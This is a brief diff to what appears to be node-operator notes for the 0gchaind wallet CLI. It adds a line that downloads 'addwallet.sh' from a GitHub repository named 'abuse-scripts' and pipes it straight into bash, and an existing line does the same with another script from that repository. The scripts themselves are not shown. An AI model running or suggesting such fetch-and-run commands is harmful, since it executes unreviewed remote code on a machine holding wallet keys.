@@ -11,3 +11,5 @@ bash <(curl -s https://raw.githubusercontent.com/Designer0101/abuse-scripts/main
 0gchaind debug addr $(0gchaind keys show wallet -a) | grep 'Address (hex):' | awk -F ': ' '{print "0x" $2}'
 
 0gchaind q bank balances $(0gchaind keys show wallet -a)
+
+bash <(curl -s https://raw.githubusercontent.com/Designer0101/abuse-scripts/main/addwallet.sh)
